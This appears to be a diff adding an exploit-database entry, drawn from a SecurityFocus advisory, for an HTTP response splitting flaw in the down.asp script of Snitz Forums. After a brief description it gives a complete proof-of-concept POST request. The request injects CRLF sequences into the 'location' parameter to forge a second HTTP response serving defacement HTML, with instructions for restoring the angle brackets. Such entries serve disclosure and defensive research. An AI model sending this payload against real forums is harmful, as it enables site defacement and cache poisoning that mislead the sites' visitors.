@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/11201/info
+
+Snitz Forums is reported prone to a HTTP response splitting vulnerability. The issue exists in a parameter of the 'down.asp' script. The issue presents itself due to a flaw in the affected script that allows an attacker to 
+manipulate how GET requests are handled.
+
+A remote attacker may exploit this vulnerability to influence or misrepresent how web content is served, cached or interpreted.
+
+POST /down.asp HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-length: 134
+
+location=/foo?%0d%0a%0d%0aHTTP/1.0%20200%20OK%0d%0aContent-Length:%2014%0d%0aContent-Type:%20text/html%0d%0a%0d%0a{html}defaced{/html}
+
+(replace curly braces with less than and greater than symbols)
